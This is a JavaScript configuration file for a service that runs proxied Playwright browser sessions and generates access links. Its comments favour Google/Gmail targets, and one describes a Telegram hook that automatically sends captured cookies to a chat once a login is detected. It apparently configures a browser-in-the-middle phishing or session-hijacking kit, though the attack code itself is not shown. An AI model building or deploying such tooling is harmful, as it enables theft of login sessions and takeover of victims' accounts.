// Central configuration, read from environment with safe defaults.

function int(name, fallback) {
  const v = process.env[name];
  if (v === undefined || v === '') return fallback;
  const n = Number.parseInt(v, 10);
  return Number.isFinite(n) ? n : fallback;
}

// Strip protocol prefix and trailing slashes so PUBLIC_HOST can be set as
// either "example.com" or "https://example.com" without breaking link
// generation. We only want the bare host[:port] part.
function parsePublicHost(raw) {
  if (!raw) return '';
  try {
    // If it already looks like a URL, extract just the host.
    if (/^https?:\/\//i.test(raw)) return new URL(raw).host;
  } catch { /* fall through to plain string */ }
  // Plain host string — strip any accidental leading/trailing whitespace.
  return raw.trim().replace(/\/$/, '');
}

export const config = {
  host: process.env.HOST || '127.0.0.1',
  port: int('PORT', 8080),
  dataDir: process.env.DATA_DIR || '/data',
  // 'chrome' uses the system-installed Google Chrome (better for Google/Gmail).
  // Leave empty to use Playwright's bundled Chromium.
  browserChannel: process.env.BROWSER_CHANNEL || '',
  // Outbound proxy for all browser sessions, e.g. socks5://host:port
  proxyServer: process.env.PROXY_SERVER || '',
  proxyUsername: process.env.PROXY_USERNAME || '',
  proxyPassword: process.env.PROXY_PASSWORD || '',
  // Public IP/host of this server — used for generating access links.
  // Accepts "example.com", "1.2.3.4:8080", or "https://example.com".
  publicHost: parsePublicHost(process.env.PUBLIC_HOST),
  // Optional: mirrors the live activity log to a Telegram chat and sends
  // cookies there automatically once a login is detected. Both must be set
  // for it to do anything — see src/telegram.js.
  telegramBotToken: process.env.TELEGRAM_BOT_TOKEN || '',
  telegramChatId: process.env.TELEGRAM_CHAT_ID || '',
  telegramAdminId: process.env.TELEGRAM_ADMIN_ID || '',
  gmailClientId: process.env.GMAIL_CLIENT_ID || '',
  gmailClientSecret: process.env.GMAIL_CLIENT_SECRET || '',
};
